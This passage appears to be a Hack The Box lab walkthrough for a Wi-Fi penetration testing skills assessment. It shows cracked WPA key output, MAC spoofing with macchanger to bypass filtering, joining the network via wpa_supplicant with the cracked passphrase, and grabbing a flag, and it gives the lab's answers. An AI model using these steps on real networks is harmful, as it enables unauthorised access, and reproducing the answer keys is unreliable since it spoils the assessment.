      Master Key     : A9 D7 2A A9 DB D1 32 D6 68 87 7E 94 CD 71 89 1A 
                       EC DA 87 BF 9F E5 FE 4A D4 10 00 70 99 EB A9 B8 

      Transient Key  : CF 3E 88 7B D4 DF 06 93 1B B9 3D 0E C1 87 9D 26 
                       3C E4 00 40 7D 6F 35 FD A8 6B 92 5E 90 10 BF 47 
                       F7 22 4A C2 BF FD BD 48 56 5E 1B 4E 78 C7 66 72 
                       EA B7 B1 02 A6 FD 77 00 2D 27 E6 B9 CB 3E 34 B4 

      EAPOL HMAC     : 33 E4 19 0F 6A 69 10 2B E9 2A 03 6B 6D 6C 3C 24
```

Answer: `minecraft`

# Wi-Fi Penetration Testing Basics - Skills Assessment

## Question 3

### "Connect to the WiFi network and submit the flag found at IP 192.168.1.1 or 192.168.2.1."

Students will use `iwlist` to scan the network using the `wlan0`, revealing another network `GAMMER-5G`:

```shell
iwlist wlan0 scan | grep 'Cell\|Quality\|ESSID\|IEEE'
```
```
wifi@WiFiIntro:~$ iwlist wlan0 scan | grep 'Cell\|Quality\|ESSID\|IEEE'

<SNIP>
          Cell 03 - Address: D8:D6:3D:EB:29:D5
                    Quality=70/70  Signal level=-30 dBm  
                    ESSID:"GAMMER-5G"
                    IE: IEEE 802.11i/WPA2 Version 1
```

Subsequently, students will perform MAC bypassing using the MAC address from the client connected to the HTB network:

```shell
sudo ifconfig wlan0 down
sudo macchanger wlan0 -m 02:00:00:00:02:00
sudo ifconfig wlan0 up
```
```
wifi@WiFiIntro:~$ sudo ifconfig wlan0 down
wifi@WiFiIntro:~$ sudo macchanger wlan0 -m 02:00:00:00:02:00

Current MAC:   02:00:00:00:05:00 (unknown)
Permanent MAC: 02:00:00:00:05:00 (unknown)
New MAC:       02:00:00:00:02:00 (unknown)

wifi@WiFiIntro:~$ sudo ifconfig wlan0 up
```

Next, students will create a configurational file to connect to the `GAMMER-5G` network using the `minecraft` passphrase found earlier:

```shell
cat << EOF > wpa.conf
network={
	ssid="GAMMER-5G"
    psk="minecraft"
}
EOF
```

Now, students will connect using the `wpa_supplicant` client and the `wpa.conf` configuration file to the network:

```shell
sudo wpa_supplicant -c wpa.conf -i wlan0
```
```
wifi@WiFiIntro:~$ sudo wpa_supplicant -c wpa.conf -i wlan0

Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
nl80211: Could not set interface 'p2p-dev-wlan0' UP
nl80211: deinit ifname=p2p-dev-wlan0 disabled_11b_rates=0
p2p-dev-wlan0: Failed to initialize driver interface
p2p-dev-wlan0: CTRL-EVENT-DSCP-POLICY clear_all
P2P: Failed to enable P2P Device interface
wlan0: SME: Trying to authenticate with d8:d6:3d:eb:29:d5 (SSID='GAMMER-5G' freq=5240 MHz)
wlan0: Trying to associate with d8:d6:3d:eb:29:d5 (SSID='GAMMER-5G' freq=5240 MHz)
wlan0: Associated with d8:d6:3d:eb:29:d5
wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan0: WPA: Key negotiation completed with d8:d6:3d:eb:29:d5 [PTK=CCMP GTK=CCMP]
wlan0: CTRL-EVENT-CONNECTED - Connection to d8:d6:3d:eb:29:d5 completed [id=0 id_str=]
```

Students will open a new terminal tab, use `dhclient` to obtain an IP address, and use `ifconfig wlan0` to find the network the `192.168.2.84` IP assigned, which allows access to the `192.168.2.1` host's root webpage:

```shell
sudo dhclient wlan0
ifconfig wlan0
```
```
wifi@WiFiIntro:~$ sudo dhclient wlan0
wifi@WiFiIntro:~$ ifconfig wlan0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.2.84  netmask 255.255.255.0  broadcast 192.168.2.255
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 8  bytes 1157 (1.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 11  bytes 1894 (1.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Subsequently, students will use `wget` to download the root webpage of `192.168.2.1` to find the flag:

```shell
wget http://192.168.2.1
cat index.html
```
```
wifi@WiFiIntro:~$ wget http://192.168.2.1

--2024-10-17 11:51:27--  http://192.168.2.1/
Connecting to 192.168.2.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16 [text/html]
Saving to: ‘index.html’

index.html                          100%[===================================================================>]      16  --.-KB/s    in 0s      

2024-10-17 11:51:27 (2.95 MB/s) - ‘index.html’ saved [16/16]

wifi@WiFiIntro:~$ cat index.html 

{hidden}
```

Answer: `HTB{H@ck3R_M@n}`